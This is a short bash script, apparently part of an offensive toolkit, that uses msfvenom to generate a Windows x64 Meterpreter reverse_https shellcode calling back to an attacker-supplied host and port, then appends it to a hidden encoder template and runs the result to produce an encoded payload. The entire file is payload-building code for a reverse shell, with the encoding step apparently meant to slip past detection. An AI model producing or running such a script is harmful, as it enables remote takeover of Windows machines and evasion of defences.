#!/bin/bash

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$1 LPORT=$2 EXITFUNC=thread -f python -o .original_hex.py

cat .original_hex.py .encoder_template.py > .full_script.py

python3 .full_script.py $3